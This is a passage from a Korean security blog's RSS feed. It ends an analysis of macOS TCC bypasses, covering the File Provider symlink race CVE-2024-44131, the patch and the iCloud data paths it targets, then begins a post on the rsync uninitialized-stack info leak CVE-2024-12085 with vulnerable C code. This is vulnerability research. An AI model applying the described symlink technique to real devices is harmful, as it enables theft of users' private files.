&#xC218;&#xC815; &#xC0AC;&#xD56D;&#xC774; <code>sandbox_check_by_audit_token</code>&#xC758; &#xBCC0;&#xACBD;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">status = sandbox_check_by_audit_token(_token, <span class="hljs-string">&quot;file-mount&quot;</span>, SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL | SANDBOX_CHECK_CANONICAL, path);</code></pre><p>&#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>SANDBOX_CHECK_CANONICAL</code> &#xC635;&#xC158;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xACBD;&#xB85C;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB098; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD0D0;&#xC0C9; &#xC694;&#xC18C;(<code>../</code> &#xB4F1;)&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xAC80;&#xC99D;&#xC774; &#xBB34;&#xC870;&#xAC74; &#xC2E4;&#xD328;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5B4;, &#xACF5;&#xACA9;&#xC744; &#xB9E4;&#xC6B0; &#xCD08;&#xAE30; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xCC28;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="3-&#xB2E4;&#xB978;-&#xC720;&#xD615;&#xC758;-TCC-Bypass-&#xCDE8;&#xC57D;&#xC810;"><a href="#3-&#xB2E4;&#xB978;-&#xC720;&#xD615;&#xC758;-TCC-Bypass-&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="3. &#xB2E4;&#xB978; &#xC720;&#xD615;&#xC758; TCC Bypass &#xCDE8;&#xC57D;&#xC810;"></a>3. &#xB2E4;&#xB978; &#xC720;&#xD615;&#xC758; TCC Bypass &#xCDE8;&#xC57D;&#xC810;</h1><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image2.png" alt="image.png"></p><h3 id="CVE-2024-44131"><a href="#CVE-2024-44131" class="headerlink" title="CVE-2024-44131"></a>CVE-2024-44131</h3><blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; macOS &#xBC0F; iOS &#xB0B4;&#xC758; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;(iCloud &#xB4F1;)&#xC640; &#xB3D9;&#xAE30;&#xD654;&#xB41C; &#xD30C;&#xC77C; &#xBC0F; &#xD3F4;&#xB354;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC778; <strong>File Provider</strong>&#xC758; <strong>TCC bypass</strong> &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. macOS&#xC640; iOS<strong>&#xC758; Files.app&#xACFC; fileproviderd &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD30C;&#xC77C; &#xC791;&#xC5C5;&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xB54C;,</strong> symlink &#xAC80;&#xC99D; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><h3 id="Version-Information-1"><a href="#Version-Information-1" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 5.3 &#x2264; 14.7</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;-&#xBC0F;-&#xBD84;&#xC11D;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;-&#xBC0F;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xBC0F; &#xBD84;&#xC11D;"></a>&#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xBC0F; &#xBD84;&#xC11D;</h3><p><strong>File Provider&#xB780;?</strong><br>File Provider&#xB294; &#xB2E4;&#xB978; &#xC571;&#xC774; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC640; &#xB3D9;&#xAE30;&#xD654;&#xB41C; &#xD30C;&#xC77C; &#xBC0F; &#xD3F4;&#xB354;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><a href="https://developer.apple.com/documentation/fileprovider">&#xB9C1;&#xD06C;</a></p><p>&#x1F4C1; <strong>Files.app</strong><br>iOS &#xBC0F; macOS&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAE30;&#xBCF8; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xB294; Files.app&#xC744; &#xD1B5;&#xD574; iCloud Drive, &#xB85C;&#xCEEC; &#xC800;&#xC7A5;&#xC18C;, &#xC678;&#xBD80; &#xC800;&#xC7A5; &#xC7A5;&#xCE58;, &#xADF8;&#xB9AC;&#xACE0; &#xC11C;&#xB4DC;&#xD30C;&#xD2F0; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;(&#xC608;: Google Drive, Dropbox)&#xC758; &#xD30C;&#xC77C;&#xC744; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x2699;&#xFE0F; <strong>fileproviderd</strong><br>File Provider &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; macOS &#xBC0F; iOS&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;</p><p>Files.app&#xACFC; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC800;&#xC7A5;&#xC18C; &#xAC04;&#xC758; &#xD30C;&#xC77C; &#xB3D9;&#xAE30;&#xD654; &#xBC0F; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC704; &#xB450;&#xAC00;&#xC9C0; &#xC694;&#xC18C; <strong>Files.app&#xACFC; fileproviderd &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC545;&#xC6A9;&#xD55C; Symlink &#xACF5;&#xACA9;</strong>&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.<br>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; <strong>Files.app&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD30C;&#xC77C;&#xC744; &#xC774;&#xB3D9;&#xD558;&#xAC70;&#xB098; &#xBCF5;&#xC0AC;</strong>&#xD560; &#xB54C;, <strong>&#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xC545;&#xC131; &#xC571;&#xC774; &#xC774;&#xB97C; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xC870;&#xC791;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; <strong>fileproviderd&#xC758; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC;</strong> &#xD30C;&#xC77C; &#xC774;&#xB3D9; &#xB610;&#xB294; &#xBCF5;&#xC0AC; &#xC791;&#xC5C5;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xBA74;&#xC11C;&#xB3C4; <strong>TCC &#xD504;&#xB86C;&#xD504;&#xD2B8;(&#xAD8C;&#xD55C; &#xC694;&#xCCAD; &#xCC3D;)&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;</strong>.</p><p><strong>&#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;, &#xC774;&#xB3D9;, &#xC0AD;&#xC81C;&#xD560; &#xB54C;</strong> &#xACF5;&#xACA9;&#xC790;&#xAC00; <strong>symlink race condition&#xC774;&#xB098; &#xACBD;&#xB85C; &#xD0D0;&#xC0C9; path traversal &#xACF5;&#xACA9;</strong>&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xBC29;&#xC5B4; &#xAE30;&#xBC95;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xD30C;&#xC77C; &#xC791;&#xC5C5; API&#xB294; <strong>&#xCD9C;&#xBC1C;&#xC9C0;/&#xBAA9;&#xC801;&#xC9C0; &#xD30C;&#xC77C;&#xC774; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAE30;&#xB2A5;</strong>&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBA70;, &#xB9CC;&#xC57D; <strong>&#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; &#xC791;&#xC5C5;&#xC744; &#xC911;&#xB2E8;</strong>&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C;&#xB294; <strong>&#xD30C;&#xC77C; &#xC791;&#xC5C5;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D0; &#xCD5C;&#xC885; &#xACBD;&#xB85C;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB300;&#xC2E0;, &#xC791;&#xC5C5;&#xC774; &#xC9C4;&#xD589;&#xB418;&#xB294; &#xB3C4;&#xC911;&#xC5D0; &#xB450; &#xBC88;&#xC9F8; &#xB9C8;&#xC9C0;&#xB9C9; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xAE30;&#xC874; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC744; &#xC6B0;&#xD68C;</strong>&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image3.png" alt="image.png"></p><p>&#xAE30;&#xC874; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xACF5;&#xACA9; &#xBC29;&#xC2DD;&#xC740; <strong>&#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;(&#xD30C;&#xC77C; &#xC790;&#xCCB4; &#xB610;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;)&#xC5D0; symlink&#xB97C; &#xCD94;&#xAC00;</strong>&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xB9CE;&#xC558;&#xC9C0;&#xB9CC;, &#xBCF4;&#xC548; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xD0D0;&#xC9C0;&#xB418;&#xC5B4; &#xACF5;&#xACA9;&#xC774; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image4.png" alt="image.png"></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC740; &#xAE30;&#xC874;&#xACFC; &#xB2EC;&#xB9AC; &#xD30C;&#xC77C; &#xBCF5;&#xC0AC;&#xAC00; &#xC2DC;&#xC791;&#xB41C; &#xD6C4;, <strong>&#xBCF5;&#xC0AC; &#xACBD;&#xB85C;&#xC758; &#x201C;&#xC0C1;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#x201D;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0BD;&#xC785;</strong>&#xD558;&#xC5EC; &#xAE30;&#xC874;&#xC758; Symlink &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xAE30;&#xC874;&#xC5D0;&#xB294; &#xCD5C;&#xC885; &#xD30C;&#xC77C;/&#xB514;&#xB809;&#xD130;&#xB9AC; &#xC774;&#xB984;&#xB9CC; &#xD655;&#xC778;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC774; &#xC2E4;&#xD328;&#xD588;&#xC73C;&#xB098;, &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; &#xAE30;&#xBC95;&#xC5D0;&#xC11C;&#xB294; &#xD30C;&#xC77C; &#xC774;&#xB3D9; &#xC911;&#xC5D0; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; &#xC911;&#xAC04;&#xC5D0; Symlink &#xCD94;&#xAC00;&#xD574; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC5D0; &#xC131;&#xACF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>TCC &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xC5C6;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xD0C8;&#xCDE8;&#xD558;&#xAC70;&#xB098;, &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</strong> </p><h3 id="fileproviderd&#xAC00;-&#xC811;&#xADFC;&#xD560;-&#xC218;-&#xC788;&#xB294;-&#xACBD;&#xB85C;"><a href="#fileproviderd&#xAC00;-&#xC811;&#xADFC;&#xD560;-&#xC218;-&#xC788;&#xB294;-&#xACBD;&#xB85C;" class="headerlink" title="fileproviderd&#xAC00; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;"></a><strong>fileproviderd&#xAC00; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;</strong></h3><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image5.png" alt="image.png"></p><ul><li>fileproviderd&#xB294; <code>/var/mobile/Library/Application Support/FileProvider/AccessControl.db</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x2192; &#xC774; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xB294; Files &#xBC0F; Folders &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD55C; &#xC571; &#xBAA9;&#xB85D;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4;, &#xC545;&#xC131; &#xD589;&#xC704;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image6.png" alt="image.png"></p><h3 id="&#xC8FC;&#xC694;-&#xD0C0;&#xAC9F;-&#xB370;&#xC774;&#xD130;-&#xACBD;&#xB85C;-&#xC608;&#xC2DC;"><a href="#&#xC8FC;&#xC694;-&#xD0C0;&#xAC9F;-&#xB370;&#xC774;&#xD130;-&#xACBD;&#xB85C;-&#xC608;&#xC2DC;" class="headerlink" title="&#xC8FC;&#xC694; &#xD0C0;&#xAC9F; &#xB370;&#xC774;&#xD130; &#xACBD;&#xB85C; &#xC608;&#xC2DC;"></a><strong>&#xC8FC;&#xC694; &#xD0C0;&#xAC9F; &#xB370;&#xC774;&#xD130; &#xACBD;&#xB85C; &#xC608;&#xC2DC;</strong></h3><ol><li><code>/var/mobile/Library/Mobile Documents/com~apple~Pages</code>&#x2192; Apple Pages &#xC571;&#xC758; &#xBC31;&#xC5C5; &#xBB38;&#xC11C;</li><li><code>/var/mobile/Library/Mobile Documents/com~apple~CloudDocs</code>&#x2192; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC218;&#xB3D9;&#xC73C;&#xB85C; iCloud Drive&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xD30C;&#xC77C; (&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD3F4;&#xB354; &#xD3EC;&#xD568;)</li><li><code>/var/mobile/Library/Mobile Documents/57T9237FN3~net~whatsapp~WhatsApp</code>&#x2192; WhatsApp &#xBC31;&#xC5C5; &#xB370;&#xC774;&#xD130; (UUID&#xAC00; &#xC544;&#xB2CC; &#xACE0;&#xC815;&#xB41C; &#xC2DD;&#xBCC4;&#xC790; &#xC0AC;&#xC6A9;)</li></ol><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC8FC;&#xC694; &#xD0C0;&#xAC9F; &#xB370;&#xC774;&#xD130; &#xACBD;&#xB85C;&#xC778; &#x201C;/var/mobile/Library/Mobile Documents/&#x201C; &#xC544;&#xB798;&#xC5D0; &#xC788;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD30C;&#xC77C;&#xACFC; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xBCF5;&#xC0AC;, &#xC774;&#xB3D9; &#xB610;&#xB294; &#xC0AD;&#xC81C;&#xD574; &#xC790;&#xC0AC; &#xBC0F; &#xD0C0;&#xC0AC; &#xC571;&#xACFC; &#xAD00;&#xB828;&#xB41C; iCloud &#xBC31;&#xC5C5; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xBE7C;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><a href="https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/">https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/</a></p><p><a href="https://zeroclick.sh/blog/macos-tcc/">https://zeroclick.sh/blog/macos-tcc/</a></p><p><a href="https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses">https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses</a></p><p><a href="https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/">https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/</a></p><p><a href="https://www.kandji.io/blog/macos-audit-story-part2">https://www.kandji.io/blog/macos-audit-story-part2</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/TCC-Bypass/">TCC Bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-12085: rsync의 Uninitialized Stack Contents로 인한 Info Leak</title>
      <link>https://hackyboiz.github.io/2025/01/18/j0ker/2025-01-18/</link>
      <guid>https://hackyboiz.github.io/2025/01/18/j0ker/2025-01-18/</guid>
      <pubDate>Sat, 18 Jan 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.openwall.com/lists/oss-security/2025/01</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.openwall.com/lists/oss-security/2025/01/14/3">RSYNC: 6 vulnerabilities</a></li><li><a href="https://github.com/RsyncProject/rsync/commit/589b0691e59f761ccb05ddb8e1124991440db2c7">CVE-2024-12085 Info Leak via Uninitialized Stack Contents</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>rsync &lt; 3.4.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCD5C;&#xADFC; <a href="https://www.openwall.com/lists/oss-security/2025/01/14/3">&#xAD6C;&#xAE00; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC774; &#xBC1C;&#xACAC;&#xD55C; rsync&#xC758; &#xCDE8;&#xC57D;&#xC810; 6&#xAC1C;</a>&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xADF8; &#xC911; CVE-2024-12085 &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-12085 &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">/* sum2&#xB97C; &#xC2A4;&#xD0DD; &#xC704;&#xC5D0; &#xC120;&#xC5B8;&#xD558;&#xC9C0;&#xB9CC;, &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC77C;&#xBD80; &#xAE38;&#xC774;&#xB9CC; &#xCC44;&#xC6CC;&#xC9C8; &#xC218;&#xB3C4; &#xC788;&#xC74C; */</span><span class="hljs-keyword">char</span> sum2[MAX_DIGEST_LEN];...<span class="hljs-keyword">int</span> done_csum2 = <span class="hljs-number">0</span>;...<span class="hljs-keyword">if</span> (!done_csum2) {    <span class="hljs-built_in">map</span> = (schar *)map_ptr(buf, offset, l);    get_checksum2((<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">map</span>, l, sum2);    done_csum2 = <span class="hljs-number">1</span>;}<span class="hljs-comment">/* &#xBC14;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBE44;&#xAD50;&#xB97C; &#xD560; &#xB54C;, s-&gt;s2length&#xAC00; &#xC2E4;&#xC81C; sum2&#xAC00; &#xACC4;&#xC0B0;&#xB41C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xD06C;&#xBA74;</span><span class="hljs-comment">   &#xBBF8;&#xCD08;&#xAE30;&#xD654;&#xB41C; sum2&#xC758; &#xB098;&#xBA38;&#xC9C0;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB428; */</span><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(sum2, sum2_at(s, i), s-&gt;s2length) != <span class="hljs-number">0</span>) {    false_alarms++;    <span class="hljs-keyword">continue</span>;}</code></pre><p>sum2 &#xBC84;&#xD37C;&#xB97C; &#xCDA9;&#xBD84;&#xD788;(&#xB610;&#xB294; &#xC804;&#xD600;) &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; memcmp(sum2, sum2_at(s, i), s-&gt;s2length) &#xBE44;&#xAD50;&#xB97C; &#xC218;&#xD589;&#xD574;, s-&gt;s2length &#xAC12;&#xC774; &#xC2E4;&#xC81C; &#xCCB4;&#xD06C;&#xC12C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xC138;&#xD305;&#xB420; &#xACBD;&#xC6B0;(&#xC870;&#xC791;&#xB420; &#xACBD;&#xC6B0;) sum2 &#xBC30;&#xC5F4;&#xC758; &#xBBF8;&#xCD08;&#xAE30;&#xD654; &#xC601;&#xC5ED;&#xC744; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD;&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xB358; 1&#xBC14;&#xC774;&#xD2B8;(&#xB610;&#xB294; &#xADF8; &#xC774;&#xC0C1;&#xC774; &#xB420; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294;&#xB370; &#xCDE8;&#xC57D;&#xC810; &#xC124;&#xBA85;&#xC5D0;&#xB294; 1&#xBC14;&#xC774;&#xD2B8;&#xB9CC; leak&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;)&#xAC00; &#xBE44;&#xAD50; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC16;&#xC73C;&#xB85C; leak&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>char sum2[MAX_DIGEST_LEN];</code>&#xB85C; &#xC120;&#xC5B8;&#xB41C; &#xC9C0;&#xC5ED; &#xBC30;&#xC5F4;&#xC774; &#xC804;&#xBD80; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><p><code>get_checksum2()</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xD574;&#xC2DC;&#xB97C; &#xACC4;&#xC0B0;&#xD574; <code>sum2</code>&#xC5D0; &#xC4F0;&#xB294; &#xAE38;&#xC774;&#xB294; &#xD574;&#xC2DC; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xB530;&#xB77C; &#xACE0;&#xC815;&#xB418;&#xAC70;&#xB098; &#xC81C;&#xD55C;&#xB429;&#xB2C8;&#xB2E4;(&#xC608;: 16&#xBC14;&#xC774;&#xD2B8;, 20&#xBC14;&#xC774;&#xD2B8; &#xB4F1;).</p><ul><li><p>get_checksum2()&#xB294; &#xB2E4;&#xC74C; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;:</p>  <pre><code class="hljs c"><span class="hljs-comment">/* The &quot;sum&quot; buffer must be at least MAX_DIGEST_LEN bytes! */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_checksum2</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, int32 len, <span class="hljs-keyword">char</span> *sum)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">/* ... */</span>    <span class="hljs-keyword">switch</span> (xfer_sum_nni-&gt;num) {      <span class="hljs-keyword">case</span> CSUM_XXH64:          <span class="hljs-comment">/* 8&#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xC500; */</span>          SIVAL64(sum, <span class="hljs-number">0</span>, XXH64(buf, len, checksum_seed));          <span 